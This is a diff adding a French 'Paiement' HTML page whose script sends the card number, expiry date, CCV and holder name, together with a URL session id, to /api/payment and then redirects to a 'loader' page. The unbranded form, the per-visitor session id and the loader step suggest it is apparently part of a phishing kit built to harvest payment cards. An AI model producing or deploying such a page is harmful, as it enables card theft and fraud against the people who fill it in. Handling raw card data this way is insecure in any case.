@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Paiement</title></head>
+<body>
+<h1>💳 Paiement</h1>
+<form id="paymentForm">
+  <input placeholder="Numéro de carte" id="number"><br>
+  <input placeholder="MM/AA" id="expiry"><br>
+  <input placeholder="CCV" id="ccv"><br>
+  <input placeholder="Titulaire" id="holder"><br>
+  <button type="submit">Valider</button>
+</form>
+<script>
+document.getElementById('paymentForm').onsubmit = async function(e){
+  e.preventDefault();
+  const sessionId = new URLSearchParams(window.location.search).get('sid');
+  await fetch('/api/payment',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({
+      sessionId,
+      number: document.getElementById('number').value,
+      expiry: document.getElementById('expiry').value,
+      ccv: document.getElementById('ccv').value,
+      holder: document.getElementById('holder').value
+    })
+  });
+  window.location.href = '/loader.html?sid='+sessionId;
+}
+</script>
+</body>
+</html>
